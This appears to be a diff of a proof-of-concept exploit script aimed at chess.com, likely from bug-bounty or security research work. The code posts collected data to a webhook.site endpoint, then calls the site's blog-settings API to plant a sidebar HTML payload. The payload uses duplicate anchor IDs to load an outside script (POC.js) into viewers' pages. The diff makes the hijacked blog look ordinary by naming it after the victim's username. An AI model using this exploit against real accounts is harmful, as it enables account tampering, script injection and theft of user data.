@@ -58,11 +58,12 @@ fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
     body: exfilData
 });
 const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
+const username = window.context.user.username;
 const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
 const requestBody = {
     "blogDetails": {
-        "url": "hacked-blog", //
-        "name": "Important Update",
+        "url": username, //
+        "name": username+" blog",
         "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
         "sidebarBlock": maliciousSidebar
     },
